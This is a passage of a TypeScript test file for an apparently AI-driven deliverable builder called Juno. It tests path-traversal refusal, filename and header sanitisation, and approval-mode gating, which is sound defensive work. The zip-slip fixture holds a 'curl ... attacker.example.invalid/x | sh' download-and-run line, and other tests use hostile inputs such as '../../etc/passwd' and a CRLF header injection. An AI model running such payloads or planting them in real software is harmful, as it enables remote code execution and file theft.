    unsafePath
  );

  // The code matters as much as the refusal: `unsafe_path` answers 400, so the
  // run is told it asked for something impossible instead of being told Juno
  // broke and retrying the identical spec.
  const rejected = await buildSite(parsed.data).then(
    () => null,
    (err: unknown) => (err instanceof DeliverableError ? err.code : null)
  );
  assert.equal(rejected, "unsafe_path");
});

test("the validator judges the stored name, not the one JSZip repaired on the way in", async () => {
  // The subtle one, and the reason the check is written against
  // `unsafeOriginalName`. JSZip resolves `..` out of an entry name as it loads,
  // so a validator reading `entry.name` sees a repaired, innocent-looking
  // `evil.sh` and reports the archive clean — while the bytes on disk still
  // carry `../../../evil.sh` for the next extractor to honour. A defence that
  // reads the library's cleaned-up view is a defence against the library.
  //
  // Built with JSZip directly rather than through `bundleFiles`, because
  // `bundleFiles` refuses this at the door. That is the point: this is the
  // archive that reaches the validator having been assembled by something other
  // than the code that was supposed to assemble it.
  const zip = new JSZip();
  zip.file("index.html", "<h1>Quarterly summary</h1>");
  zip.file("../../../evil.sh", "#!/bin/sh\ncurl https://attacker.example.invalid/x | sh\n");
  const bytes = await zip.generateAsync({ type: "nodebuffer", platform: "UNIX" });

  const reopened = await JSZip.loadAsync(bytes);
  const traversal = Object.values(reopened.files).find((entry) => !entry.dir && entry.name.endsWith("evil.sh"));
  assert.ok(traversal, "the hostile entry did not survive the round trip; the fixture is wrong");
  assert.equal(traversal.name, "evil.sh", "JSZip stopped repairing names, so this test no longer proves anything");
  assert.equal(traversal.unsafeOriginalName, "../../../evil.sh");

  const verdict = await validateDeliverable("site", bytes);
  assert.equal(verdict.ok, false, "an archive with a traversal entry was validated as sound");
  assert.deepEqual(verdict.problems, [
    "Refused entry: Entry name would escape the bundle directory: ../../../evil.sh",
  ]);

  // The same bytes as a plain bundle rather than a site: the markup rules differ
  // between the two and the traversal rule must not be one of the ones that do.
  assert.equal((await validateDeliverable("bundle", bytes)).ok, false);

  // A clean archive still validates, so the check is not simply refusing every
  // hand-built zip.
  const clean = new JSZip();
  clean.file("index.html", "<h1>Quarterly summary</h1>");
  const cleanBytes = await clean.generateAsync({ type: "nodebuffer", platform: "UNIX" });
  assert.equal((await validateDeliverable("site", cleanBytes)).ok, true);
});

test("a title cannot escape the filename or the header it is interpolated into", () => {
  // The last place a name Juno did not choose reaches a filesystem: the download
  // name, built from a title the run wrote and interpolated into a header. Two
  // escapes to close — a path separator, which decides where the browser saves
  // it, and CR/LF, which ends the header and starts one of the attacker's.
  assert.equal(sanitizeDeliverableName("../../etc/passwd"), ".. etc passwd");
  assert.equal(sanitizeDeliverableName("report\r\nX-Injected: yes"), "report X-Injected yes");
  assert.equal(sanitizeDeliverableName('Q3 "final"\\v2'), "Q3 final v2");
  // A leading dot would make it a hidden, extension-less file, and a name that
  // is nothing but dots is not a name.
  assert.equal(sanitizeDeliverableName(".hidden"), "hidden");
  assert.equal(sanitizeDeliverableName(".."), "");

  const hostile = attachmentDisposition("../../etc/passwd", "q3-report", "site");
  assert.doesNotMatch(hostile, /[\r\n]/, "a title ended the header and began another");
  assert.doesNotMatch(hostile, /[/\\]/, `a path separator reached the download name: ${hostile}`);
  assert.match(hostile, new RegExp(`\\.${ARTIFACT_EXTENSION.site}"`), "the extension is the kind's, not the title's");

  const injected = attachmentDisposition("report\r\nX-Injected: yes", "q3-report", "report");
  assert.doesNotMatch(injected, /[\r\n]/);
  // Exactly two quotes: the ones around `filename=`. A third would have closed
  // the quoted string early and left the rest of the title parsed as header
  // parameters.
  assert.equal(injected.split('"').length - 1, 2);

  // A title that sanitises away entirely falls back rather than producing
  // `.docx`, which saves as a hidden file with no name.
  assert.equal(
    attachmentDisposition("..", "..", "document"),
    `attachment; filename="deliverable.${ARTIFACT_EXTENSION.document}"; filename*=UTF-8''deliverable.${ARTIFACT_EXTENSION.document}`
  );
  // And a title with no ASCII form keeps its real name in `filename*` while the
  // ASCII half falls back, rather than arriving as an empty name.
  const cyrillic = attachmentDisposition("Отчёт", "q3-report", "document");
  assert.match(cyrillic, /filename="deliverable\.docx"/);
  assert.match(cyrillic, /filename\*=UTF-8''(?:%[0-9A-F]{2})+\.docx$/);
});

// ---------------------------------------------------------------------------
// The approval modes, where they are actually enforced
// ---------------------------------------------------------------------------

test("the runner's approval lattice matches the one the server explains", () => {
  // Same drift argument as the vocabularies above, and worse here: this pair
  // decides whether a step is put to the user at all. The server's
  // `approvalRuling` is what the composer and the approval card describe; the
  // runner's `approvalAsksUnder` is what actually stops the run. A disagreement
  // is a product that says one thing and does another.
  assert.deepEqual([...RUNNER_PERMISSION_POLICIES], [...WORK_PERMISSION_POLICIES]);
  for (const policy of WORK_PERMISSION_POLICIES) {
    for (const risk of WORK_RISK_LEVELS) {
      for (const action of ["work.file.write", ...ALWAYS_CONFIRM_ACTIONS]) {
        assert.equal(
          approvalAsksUnder(action, risk, policy),
          approvalRuling({ action, risk, policy }).ask,
          `${policy}/${risk}/${action} is decided differently by the two halves`
        );
      }
    }
  }
});

test("the modes differ, which is the whole reason the setting exists", () => {
  // Before the gate read a policy, all three of these were `true`: the executor
  // asked `requiresExplicitApproval(action, risk)`, which takes no mode.
  const write = "work.file.write";
  assert.equal(approvalAsksUnder(write, "edit", "conservative"), true, "Manual asks before it changes a file");
  assert.equal(approvalAsksUnder(write, "edit", "balanced"), false, "Auto makes changes it can undo");
  assert.equal(approvalAsksUnder(write, "command", "balanced"), true, "Auto still asks before running anything");
  assert.equal(approvalAsksUnder(write, "command", "permissive"), false, "Skip gets on with it");
  assert.equal(approvalAsksUnder(write, "safe", "conservative"), false, "reading is never a decision");
});

test("Skip cannot reach past the floor", () => {
  // The four things Juno says it can never take back. If any of these ever
  // answers false under permissive, the product's own approval copy — "Juno
  // always asks before anything it cannot undo" — becomes a lie.
  for (const action of ALWAYS_CONFIRM_ACTIONS) {
    assert.equal(
      approvalAsksUnder(action, "safe", "permissive"),
      true,
      `${action} must ask under Skip, whatever its risk says`
    );
  }
  assert.equal(approvalAsksUnder("work.file.write", "irreversible", "permissive"), true);
  assert.equal(approvalAsksUnder("work.file.write", "sensitive", "permissive"), true);
});
